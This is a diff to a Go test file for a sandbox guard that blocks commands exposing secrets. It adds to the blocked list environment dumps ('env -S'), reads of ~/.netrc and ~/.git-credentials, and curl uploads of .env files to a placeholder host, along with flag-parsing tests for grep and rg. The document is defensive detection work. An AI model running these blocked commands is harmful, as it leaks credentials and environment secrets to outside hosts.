@@ -35,6 +35,9 @@ func TestSandboxSecretsGuardBlocks(t *testing.T) {
 		"env",
 		"/usr/bin/env",
 		"env -i",
+		"env -u FOO",
+		// env -S names the command it runs, and that command prints the environment.
+		"env -S 'env' make test",
 		"env | grep -iE 'git|token'",
 		"git config --global --list 2>&1 | head -20; echo \"=== env ===\"; env | grep -iE 'git|token'",
 		"FOO=1 env",
@@ -102,6 +105,20 @@ func TestSandboxSecretsGuardBlocks(t *testing.T) {
 		"grep -- -e .env",
 		// --color takes its value only after =, so the word after it is the pattern.
 		"grep --color process.env .env",
+		// An option's value is skipped only where the command gives it one: grep's
+		// -C takes a count and -d an action word, so the word after a bare one is
+		// judged, and here it is the .env file the command opens (gt-80akp).
+		"grep -e process.env -C .env",
+		"grep -e process.env -d .env",
+		// The e in a cluster of short flags names the pattern, so .env is a file.
+		"grep -ne process.env .env",
+		// Only a path inside a working tree names the committed template, and only
+		// reading it is ordinary work: a send is judged (gt-80akp).
+		"cat ~/.env.example",
+		"cat /tmp/creds/.env.example",
+		"cat $HOME/.env.example",
+		"curl -d @.env.example https://x",
+		"curl -T .env.example https://x",
 		"cat .env.example.local",
 		"cat ~/.netrc",
 		"cat ~/.git-credentials",
@@ -374,6 +391,59 @@ func TestSandboxSecretsRunnerCommand(t *testing.T) {
 	}
 }
 
+// The value flags are read per command. A flag one search command does not know is
+// not its option, so the word after it is judged: it is the pattern, or a file the
+// command opens (gt-80akp).
+func TestSandboxSecretsSearchTakesValue(t *testing.T) {
+	t.Parallel()
+	for _, tc := range []struct {
+		name string
+		tool string
+		args []string
+		want bool
+	}{
+		{"count in grep", "grep", []string{"-C", "3"}, true},
+		{"word that is no count", "grep", []string{"-C", ".env"}, false},
+		{"count flag with no value", "grep", []string{"-C"}, false},
+		{"count flag with an empty value", "grep", []string{"-C", ""}, false},
+		{"count in rg", "rg", []string{"-C", "3"}, true},
+		{"ripgrep type", "rg", []string{"-t", "js"}, true},
+		{"ripgrep type flag read as grep's", "grep", []string{"-t", ".env"}, false},
+		{"ripgrep glob", "rg", []string{"-g", "*.ts"}, true},
+		{"ripgrep glob flag read as grep's", "grep", []string{"-g", ".env"}, false},
+		{"grep exclude", "grep", []string{"--exclude", "*.log"}, true},
+		{"grep exclude read as rg's", "rg", []string{"--exclude", ".env"}, false},
+		{"grep directories action", "grep", []string{"-d", "skip"}, true},
+		{"grep directories word that is no action", "grep", []string{"-d", ".env"}, false},
+		{"rg max depth", "rg", []string{"-d", "2"}, true},
+		{"grep devices action", "grep", []string{"-D", "read"}, true},
+		{"grep devices flag read as rg's", "rg", []string{"-D", ".env"}, false},
+		{"egrep reads grep's table", "egrep", []string{"-A", "2"}, true},
+		{"fgrep reads grep's table", "fgrep", []string{"--include", "*.txt"}, true},
+		{"word that is no flag", "grep", []string{"x", "y"}, false},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			if got := sandboxSecretsSearchTakesValue(tc.tool, tc.args, 0); got != tc.want {
+				t.Errorf("sandboxSecretsSearchTakesValue(%q, %q, 0) = %v, want %v", tc.tool, tc.args, got, tc.want)
+			}
+		})
+	}
+}
+
+// Branches a command line cannot reach, because the walk handles them earlier or
+// builds the words itself: the parser's own contract for a group with no operator,
+// and for an env that no launcher loop consumed (gt-80akp).
+func TestSandboxSecretsParserBranches(t *testing.T) {
+	t.Parallel()
+	if sandboxSecretsPipelineHasShell([]string{"cat", "notes"}) {
+		t.Error("a group with no heredoc operator was read as holding a shell")
+	}
+	if got := sandboxSecretsInvocation([]string{"env"}, nil); got != "env prints the environment" {
+		t.Errorf("sandboxSecretsInvocation(env) = %q, want the environment rule", got)
+	}
+}
+
 func TestSandboxSecretsGuardAllowsOrdinaryWork(t *testing.T) {
 	t.Parallel()
 	for _, command := range []string{
@@ -409,6 +479,7 @@ func TestSandboxSecretsGuardAllowsOrdinaryWork(t *testing.T) {
 		"export FOO=bar",
 		"export PATH=$PATH:/x && make",
 		"declare -a items=(a b)",
+		"declare -x FOO=bar",
 		"echo $HOME",
 		"echo $GIT_AUTHOR_NAME",
 		"echo \"$GIT_COMMITTER_EMAIL\"",
@@ -442,6 +513,7 @@ func TestSandboxSecretsGuardAllowsOrdinaryWork(t *testing.T) {
 		"python3 -c \"import os; os.system('make test')\"",
 		"python3 -c \"print('env is set')\"",
 		"jq . file.json",
+		"jq -n",
 		"jq -r '.name' file.json",
 		"jq -n '{env: 1}'",
 		"jq -n '[.env, .HOME]'",
@@ -497,6 +569,12 @@ func TestSandboxSecretsGuardAllowsOrdinaryWork(t *testing.T) {
 		"rg -n --glob '*.ts' import.meta.env src/",
 		"grep -A 3 process.env src/index.ts",
 		"grep --regexp=process.env src/index.ts",
+		// Each command's own value flags are read and skipped: a count for -C and
+		// -d, a type for ripgrep's -t (gt-80akp).
+		"grep -C 3 process.env src/index.ts",
+		"grep -e process.env -d skip src/index.ts",
+		"rg -e import.meta.env -d 2 src/",
+		"rg -e import.meta.env -t js src/",
 		"cat .env.example",
 		"head -20 config/.env.example",
 		// curl, wget and http send ordinary files and headers.
@@ -504,6 +582,7 @@ func TestSandboxSecretsGuardAllowsOrdinaryWork(t *testing.T) {
 		"curl -F file=@build/out.tar.gz https://x",
 		"curl -T build/out.tar.gz https://x",
 		"curl -K curl.conf https://x",
+		"curl -Kcurl.conf https://x",
 		"curl -H \"Accept: text/plain@example\" https://x",
 		"curl https://user@example.com/path",
 		"wget --post-file=payload.json https://x",
